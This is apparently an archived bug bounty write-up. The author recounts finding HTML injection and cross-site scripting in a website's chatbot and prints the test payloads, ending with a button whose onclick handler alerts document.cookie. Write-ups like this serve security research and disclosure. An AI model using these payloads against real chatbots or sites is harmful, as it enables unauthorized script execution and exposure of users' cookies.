# XSS via HTML Injection in Chatbot

- **Source URL:** https://medium.com/@nidishms1999/xss-via-html-injection-in-chatbot-a24c4f25dc92?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20240525034431/https://medium.com/@nidishms1999/xss-via-html-injection-in-chatbot-a24c4f25dc92
- **Fetched:** 2026-11-23
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/6130 (id 6130)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
Hello Hackers (^人^)

This is my first write-up, so ^\_\~ ..uh…you know the drill, don’t you 😉.

**How I discovered XSS via HTML Injection in Chatbot**

Let's dive into it….

I just came across a domain with chatbot,

I entered the simple HTML Tag to check how the chatbot will respond.

`<h1>Test</h1>`
Tried another payload…

`<h1><font Color=blue>HTML Injection via Chat bot </h1><h3><mark><a href="https://example.com"><center>POC</center></a></mark></h3>`
Then I tried with XSS payload;

`<button onclick="alert(document.cookie)">XSS</button>`
Yup! Got an alert..,

Thanks for reading.✌

**LinkedIn :** [https://in.linkedin.com/in/nidishnk](https://in.linkedin.com/in/nidishnk)

**ஒருமைக்கண் தான்கற்ற கல்வி ஒருவற்கு எழுமையும் ஏமாப் புடைத்து.**🔥
